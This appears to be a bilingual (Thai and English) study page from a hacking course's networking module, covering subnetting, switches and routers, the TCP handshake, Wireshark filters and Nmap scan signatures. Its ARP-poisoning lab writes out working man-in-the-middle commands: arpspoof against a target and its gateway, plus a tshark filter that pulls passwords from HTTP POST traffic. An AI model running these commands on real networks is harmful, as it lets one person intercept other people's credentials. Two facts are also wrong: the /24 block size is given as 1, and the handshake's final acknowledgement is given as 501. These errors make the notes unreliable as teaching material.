# 🌐 Networking & Packet Mechanics (TCP/IP & Wire Analysis)

> **Phase:** `Phase A — Core Foundations` | **Tags:** `#networking` `#tcpip` `#wireshark` `#subnetting` `#packet-analysis`  
> **Status:** ⏳ Upcoming | **Focus:** IP Addressing, Packet Header Analysis, 3-Way Handshake, ARP Poisoning & Port Scanning

---

## 📑 Core Modules Overview

- [ ] [[#Module 01: IPv4 Addressing & Subnetting|Module 01: Subnetting Masterclass & Binary Addressing]]
- [ ] [[#Module 02: Layer 2 vs Layer 3 Mechanics|Module 02: Switches, Routers & Default Gateway]]
- [ ] [[#Module 03: TCP 3-Way Handshake Deep Dive|Module 03: Wire Analysis (SYN, ACK, FIN, Window Size)]]
- [ ] [[#Module 04: ARP Protocol & MITM Analysis|Module 04: ARP Poisoning & Cleartext Traffic Sniffing]]
- [ ] [[#Module 05: Port Scanning Wire Signatures|Module 05: Nmap Scan Signatures on Wireshark (SYN vs Connect)]]

---

## Module 01: IPv4 Addressing & Subnetting
- **Status:** ⏳ Not Started
- **Core Concept:** โครงสร้าง IPv4 (32 bits แบ่งเป็น 4 Octets), Subnet Mask, และเทคนิคคิด Subnetting ในใจด้วย Magic Number

### 📝 Subnetting Cheat Sheet
| CIDR | Subnet Mask | Usable Hosts | Magic Number (Block Size) |
| :---: | :--- | :---: | :---: |
| `/24` | `255.255.255.0` | 254 | 1 |
| `/25` | `255.255.255.128` | 126 | 128 |
| `/26` | `255.255.255.192` | 62 | 64 |
| `/27` | `255.255.255.224` | 30 | 32 |
| `/28` | `255.255.255.240` | 14 | 16 |
| `/29` | `255.255.255.248` | 6 | 8 |
| `/30` | `255.255.255.252` | 2 (Point-to-Point) | 4 |

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:* 

---

## Module 02: Layer 2 vs Layer 3 Mechanics
- **Status:** ⏳ Not Started
- **Core Concept:** Layer 2 (Data Link) ส่งต่อด้วย MAC Address บน Switch vs Layer 3 (Network) ส่งต่อด้วย IP Address ข้าม Router

### 📝 Key Mechanics
- **Switch:** อ่านเฉพาะ Layer 2 Header มี CAM Table (MAC Address Table) สวิตช์จะไม่ Broadcast ถ้าเรียนรู้ MAC แล้ว
- **Router:** ตัด Layer 2 Header ทิ้ง แล้วสร้าง Header ใหม่ทุกครั้งที่ Hop ข้าม Network (TTL ลดลง 1 เสมอ)
- **Default Gateway:** ที่อยู่ของ Router ขาในที่เครื่องลูกข่ายใช้ส่งต่อข้อมูลเมื่อเป้าหมายอยู่นอก Subnet ของตนเอง

---

## Module 03: TCP 3-Way Handshake Deep Dive
- **Status:** ⏳ Not Started
- **Core Concept:** กลไกการเชื่อมต่อระดับ Transport Layer: `SYN` $\rightarrow$ `SYN-ACK` $\rightarrow$ `ACK`, Sequence Number Tracking, Window Size

### 📝 The Three-Way Handshake Flow
```
Client (Attacker)                               Server (Target)
       │                                               │
       │─────── [SYN] Seq=1000 ───────────────────────►│  (Client ขอเชื่อมต่อ)
       │                                               │
       │◄────── [SYN-ACK] Seq=5000, Ack=1001 ──────────│  (Server ตอบรับ + ขอเชื่อมต่อกลับ)
       │                                               │
       │─────── [ACK] Seq=1001, Ack=501 ──────────────►│  (Client ยืนยันสำเร็จ: ESTABLISHED)
       │                                               │
```

### 💻 Wireshark Display Filters
```text
# ดักดูเฉพาะแพ็กเก็ตที่เป็นจุดเริ่มต้นของ TCP Connection (SYN Packet)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# ดักดูแพ็กเก็ตที่ถูก Reset ตัดการเชื่อมต่อ
tcp.flags.reset == 1

# ดูเฉพาะการสื่อสารของพอร์ตเป้าหมาย
tcp.port == 80 || tcp.port == 443
```

---

## Module 04: ARP Protocol & MITM Analysis
- **Status:** ⏳ Not Started
- **Core Concept:** Layer 2 Attack: การส่ง Gratuitous ARP เพื่อปลอม MAC Address บน Switch, การ Forward packet และดักอ่าน Credentials ด้วย Wireshark

### 💻 Live Attack & Capture Lab
```bash
# 1. เปิด IP Forwarding บน Kali เพื่อให้เครื่องเราทำหน้าที่เป็น Router ส่งต่อแพ็กเก็ตเหยื่อ
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ปลอมตัวเป็น Gateway บอกเหยื่อ (Target) ว่า "เราคือ Gateway"
sudo arpspoof -i eth0 -t <TARGET_IP> <GATEWAY_IP>

# 3. ปลอมตัวเป็นเหยื่อ บอก Gateway ว่า "เราคือเหยื่อ" (Full Duplex MITM)
sudo arpspoof -i eth0 -t <GATEWAY_IP> <TARGET_IP>

# 4. ดักจับแพ็กเก็ตบน Terminal ด้วย Tshark คัดกรองรหัสผ่าน HTTP POST
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.file_data
```

---

## Module 05: Port Scanning Wire Signatures
- **Status:** ⏳ Not Started
- **Core Concept:** แกะรอยลายเซ็นบนสายของ Nmap: ความแตกต่างระหว่าง Stealth SYN Scan (`-sS`) กับ Full Connect Scan (`-sT`) บน Wireshark

### 📝 Scan Comparison Matrix
| Scan Type | Nmap Flag | Wire Interaction | Log Visibility |
| :--- | :---: | :--- | :--- |
| **SYN Stealth Scan** | `-sS` | ส่ง `SYN` $\rightarrow$ รับ `SYN-ACK` $\rightarrow$ ส่ง `RST` ทันที | ไม่ผ่าน Application layer (Daemon ไม่บันทึก log) |
| **TCP Connect Scan** | `-sT` | ทำครบ 3-Way Handshake เต็มรูปแบบ $\rightarrow$ ส่ง `RST` | ทิ้ง Log ไว้บน Application ชัดเจน |
| **UDP Scan** | `-sU` | ส่ง UDP Packet ว่าง $\rightarrow$ ถ้า Port ปิด จะได้ `ICMP Port Unreachable` | ทำงานช้า ต้องรอ Timeout |

### 🧠 Feynman Takeaway & Reflection
- *สรุปด้วยคำพูดตัวเอง:* 
- *จุดที่น่าสนใจ / ข้อควรระวัง:*
